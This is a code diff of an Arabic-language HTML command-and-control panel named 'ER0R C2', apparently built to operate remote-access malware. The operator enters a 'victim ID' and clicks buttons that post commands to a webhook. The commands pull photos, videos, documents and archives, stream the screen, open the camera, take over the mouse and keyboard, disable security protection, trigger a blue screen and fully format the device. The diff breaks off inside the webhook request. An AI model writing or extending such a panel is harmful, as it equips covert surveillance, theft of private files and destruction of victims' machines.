@@ -2,39 +2,63 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>ER0R C2 - ULTIMATE CONTROL</title>
+    <title>ER0R C2 - SUPREME COMMAND</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; padding: 20px; text-align: center; }
-        .panel { max-width: 900px; margin: auto; border: 2px solid #6001d2; padding: 30px; border-radius: 20px; box-shadow: 0 0 30px #6001d2; background: rgba(10, 10, 10, 0.95); }
-        .logo { width: 110px; filter: drop-shadow(0 0 10px #6001d2); margin-bottom: 20px; }
-        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 25px; }
-        .btn { background: #000; border: 1px solid #6001d2; color: #fff; padding: 15px; cursor: pointer; border-radius: 8px; font-weight: bold; width: 100%; transition: 0.3s; }
-        .btn:hover { background: #6001d2; box-shadow: 0 0 15px #6001d2; }
-        .danger { border-color: #ff0044; color: #ff0044; }
-        .danger:hover { background: #ff0044; color: #fff; }
-        #log { background: #000; color: #0f0; padding: 12px; height: 100px; overflow-y: auto; margin-top: 20px; border: 1px solid #222; font-family: monospace; border-radius: 5px; }
+        body { background: #000; color: #fff; font-family: sans-serif; padding: 10px; text-align: center; }
+        .main { max-width: 1100px; margin: auto; border: 2px solid #6001d2; padding: 20px; border-radius: 15px; box-shadow: 0 0 30px #6001d2; }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 20px; }
+        .card { background: #0a0a0a; border: 1px solid #333; padding: 10px; border-radius: 10px; }
+        .btn { background: #000; border: 1px solid #6001d2; color: #fff; padding: 10px; cursor: pointer; width: 100%; margin: 3px 0; border-radius: 5px; font-weight: bold; font-size: 12px; }
+        .btn:hover { background: #6001d2; }
+        .live-view { margin-top: 15px; border: 2px solid #6001d2; height: 350px; background: #000; position: relative; }
+        .live-view img { width: 100%; height: 100%; object-fit: contain; }
+        .danger { border-color: red; color: red; }
     </style>
 </head>
 <body>
-    <div class="panel">
-        <img src="https://i.ibb.co/vz6mD7y/download.png" class="logo">
-        <h1 style="color:#6001d2;">📟 مركز السيطرة ER0R V3</h1>
-        <input type="text" id="vID" placeholder="أدخل ID الهدف" style="width:80%; padding:15px; background:#000; border:1px solid #6001d2; color:#fff; text-align:center; margin-bottom:10px;">
+    <div class="main">
+        <img src="https://i.ibb.co/vz6mD7y/download.png" style="width:80px; filter:drop-shadow(0 0 10px #6001d2);">
+        <h2 style="color:#6001d2;">📟 إمبراطورية السيطرة ER0R V3</h2>
+        <input type="text" id="target" placeholder="أدخل ID الضحية" style="width:85%; padding:12px; background:#000; border:1px solid #6001d2; color:#fff; text-align:center;">
+
         <div class="grid">
-            <button class="btn" onclick="exe('سحب الكل')">📥 سحب صور وفيديو</button>
-            <button class="btn" onclick="exe('تصوير الشاشة')">📸 لقطة شاشة</button>
-            <button class="btn" onclick="exe('تزمير')">📢 تزمير مزعج</button>
-            <button class="btn danger" onclick="exe('تعطيل الحماية')">🛡️ إطفاء الحماية</button>
-            <button class="btn danger" onclick="exe('شاشة الموت')">💀 شاشة الموت</button>
-            <button class="btn danger" onclick="exe('فرمتة')">🔥 تدمير الجهاز</button>
+            <div class="card">
+                <h3>📁 سحب البيانات</h3>
+                <button class="btn" onclick="send('سحب صور')">🖼️ صور فقط</button>
+                <button class="btn" onclick="send('سحب فيديوهات')">🎥 فيديوهات فقط</button>
+                <button class="btn" onclick="send('سحب مستندات')">📄 مستندات</button>
+                <button class="btn" onclick="send('سحب أرشيف')">📦 ملفات مضغوطة</button>
+            </div>
+            <div class="card">
+                <h3>👁️ بث مباشر</h3>
+                <button class="btn" style="background:red;" onclick="send('بث مباشر')">🔴 بث الشاشة</button>
+                <button class="btn" style="background:blue;" onclick="send('فتح الكاميرا')">📸 فتح الكاميرا</button>
+                <button class="btn" onclick="send('تصوير الشاشة')">📸 لقطة واحدة</button>
+            </div>
+            <div class="card">
+                <h3>🖱️ تحكم مباشر</h3>
+                <button class="btn" onclick="send('تحريك الماوس')">🖱️ تحريك الماوس</button>
+                <button class="btn" onclick="send('كتابة نص')">⌨️ كتابة نص</button>
+                <button class="btn" onclick="send('تزمير')">📢 تزمير مزعج</button>
+            </div>
+            <div class="card">
+                <h3 style="color:red;">☢️ تدمير</h3>
+                <button class="btn danger" onclick="send('تعطيل الحماية')">🛡️ إطفاء الحماية</button>
+                <button class="btn danger" onclick="send('شاشة الموت')">💀 شاشة الموت</button>
+                <button class="btn danger" onclick="send('فرمتة')">🔥 فرمتة كاملة</button>
+            </div>
         </div>
-        <div id="log">> System Online. Standing by.</div>
+
+        <div class="live-view">
+            <div style="position:absolute; top:5px; left:10px; color:red; font-weight:bold;">LIVE FEED...</div>
+            <img src="https://i.ibb.co/vz6mD7y/download.png" id="streamImg">
+        </div>
     </div>
+
     <script>
-        async function exe(c) {
-            const id = document.getElementById('vID').value;
-            if(!id) return alert("أدخل ID الضحية!");
-            document.getElementById('log').innerHTML += `<br>> Executing [${c}]...`;
+        async function send(c) {
+            const id = document.getElementById('target').value;
+            if(!id) return alert("أدخل ID!");
             const cfg = await fetch('./data.json').then(r => r.json());
             await fetch(cfg.webhook_url, {
                 method: 'POST',
